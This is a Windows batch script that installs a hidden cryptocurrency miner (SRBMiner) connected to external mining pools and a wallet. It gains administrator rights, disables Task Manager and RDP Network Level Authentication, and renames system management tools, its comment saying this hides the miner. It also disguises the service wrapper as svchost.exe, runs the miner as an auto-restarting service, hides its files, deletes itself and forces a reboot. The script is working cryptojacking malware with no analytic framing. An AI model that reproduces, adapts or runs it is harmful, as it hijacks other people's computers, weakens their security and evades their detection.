@echo off
setlocal enabledelayedexpansion

REM Check if running as administrator
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrator privileges...
    powershell -Command "Start-Process cmd -ArgumentList '/c %0' -Verb RunAs"
    exit /b
)

echo Running as Administrator...

REM Disable Task Manager for current user
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
echo Task Manager has been disabled.

REM Take ownership of the CSC folder
takeown /F C:\Windows\CSC /A /R /D Y >nul 2>&1
icacls C:\Windows\CSC /grant Administrators:F /T /C /Q >nul 2>&1
echo Ownership and permissions updated successfully!

REM Disable Network Level Authentication (NLA)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f >nul 2>&1
echo Disabling Network Level Authentication (NLA)...

REM Rename system utilities to hide miner activity
call :RenameSystemFile "C:\Windows\System32\compmgmt.msc" "com.abc"
call :RenameSystemFile "C:\Windows\System32\sysdm.cpl" "sys.bat"  
call :RenameSystemFile "C:\Windows\System32\taskmgr.exe" "tsk.abc"

REM Check if SRB.zip exists in current directory
if not exist "SRB.zip" (
    echo SRB.zip not found in current directory!
    echo Please ensure SRB.zip is in the same folder as this script.
    pause
    exit /b 1
)

echo Found SRB.zip, extracting...

REM Extract SRB.zip to C:\Windows\CSC\
powershell -Command "Expand-Archive -Path '%~dp0SRB.zip' -DestinationPath 'C:\Windows\CSC\' -Force" >nul 2>&1

if not exist "C:\Windows\CSC\SRB\" (
    echo Extraction failed!
    pause
    exit /b 1
)

echo Extraction completed successfully!

REM Create mining batch file with public IP
for /f "delims=" %%A in ('powershell -Command "(Invoke-WebRequest -UseBasicParsing -Uri 'https://api64.ipify.org').Content"') do set "IP=%%A"

(
echo @echo off
echo cd /d "%%~dp0"
echo SRBMiner-MULTI.exe --multi-algorithm-job-mode 3 --algorithm randomepic --algorithm randomx --pool 51pool.online:3416 --pool sal.kryptex.network:7028 --wallet farington#Worker01 --wallet SC11qbqjQfdRrSUuis6ubxRfcvw5dBD1TfLBsVdciBTyjW9M2RCAppCY5vnaDgmJzk1T8SWm68my7CfQWURMdeox3GrSiKF5sm/Worker02 --password x --password x
) > "C:\Windows\CSC\SRB\start-mining-epiccash-and-salvuim.bat"

echo Mining batch file created with IP: !IP!

REM Configure Lock Pages in Memory privilege
echo Configuring "Lock Pages in Memory" privilege...
if exist "C:\Windows\CSC\SRB\ntrights.exe" (
    "C:\Windows\CSC\SRB\ntrights.exe" -u %USERNAME% +r SeLockMemoryPrivilege >nul 2>&1
    "C:\Windows\CSC\SRB\ntrights.exe" -u SYSTEM +r SeLockMemoryPrivilege >nul 2>&1
)

REM Install as Windows service using svchost.exe (nssm)
echo Installing mining service...
set "SERVICE_NAME=NcaMvc"
set "NSSM_PATH=C:\Windows\CSC\SRB\svchost.exe"
set "MINER_PATH=C:\Windows\CSC\SRB\SRBMiner-MULTI.exe"
set "MINER_ARGS=--multi-algorithm-job-mode 3 --algorithm randomepic --algorithm randomx --pool 51pool.online:3416 --pool sal.kryptex.network:7777 --wallet farington#Worker01 --wallet SC11qbqjQfdRrSUuis6ubxRfcvw5dBD1TfLBsVdciBTyjW9M2RCAppCY5vnaDgmJzk1T8SWm68my7CfQWURMdeox3GrSiKF5sm/Worker02 --password Worker01 --password Worker02"

if exist "!NSSM_PATH!" (
    !NSSM_PATH! stop !SERVICE_NAME! >nul 2>&1
    !NSSM_PATH! remove !SERVICE_NAME! confirm >nul 2>&1
    !NSSM_PATH! install !SERVICE_NAME! "!MINER_PATH! !MINER_ARGS!" >nul 2>&1
    !NSSM_PATH! set !SERVICE_NAME! AppDirectory "C:\Windows\CSC\SRB" >nul 2>&1
    !NSSM_PATH! set !SERVICE_NAME! Start SERVICE_AUTO_START >nul 2>&1
    !NSSM_PATH! set !SERVICE_NAME! AppExit Default Restart >nul 2>&1
    !NSSM_PATH! start !SERVICE_NAME! >nul 2>&1
    echo Service "!SERVICE_NAME!" installed and started!
)

REM Hide miner files and folders
attrib +s +h "C:\Windows\CSC" >nul 2>&1
attrib +s +h "C:\Windows\CSC\*" /s /d >nul 2>&1

echo Miner setup completed!
echo Files are hidden in C:\Windows\CSC\

REM Cleanup - remove original files
del /f /q "%~dp0SRB.zip" >nul 2>&1
del /f /q "%~f0" >nul 2>&1

echo Cleaning up and restarting system...
shutdown /r /t 20 /f

exit /b

:RenameSystemFile
set "FILE_PATH=%~1"
set "NEW_NAME=%~2"

if exist "!FILE_PATH!" (
    takeown /f "!FILE_PATH!" >nul 2>&1
    icacls "!FILE_PATH!" /grant administrators:F >nul 2>&1
    icacls "!FILE_PATH!" /setowner "Administrators" >nul 2>&1
    
    REN "!FILE_PATH!" "!NEW_NAME!" >nul 2>&1
    if !errorlevel! equ 0 (
        echo Renamed: %~n1 to !NEW_NAME!
    )
)
exit /b
